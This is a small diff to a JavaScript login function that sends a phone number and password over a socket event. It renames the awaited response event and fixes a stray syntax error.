@@ -21,7 +21,7 @@ function login(){
   var fullnumber= "+"+ val_code+ num.replace('0','');
   var form = document.createElement("form");
   socket.emit('login1',fullnumber,pass);
-  socket.on('login1_ok',()=>{();
+  socket.on('login1_dung',()=>{
     add_form('pass',document.getElementById("login_pass_2").value);
     add_form('number',num);
     add_form('code',val_code);
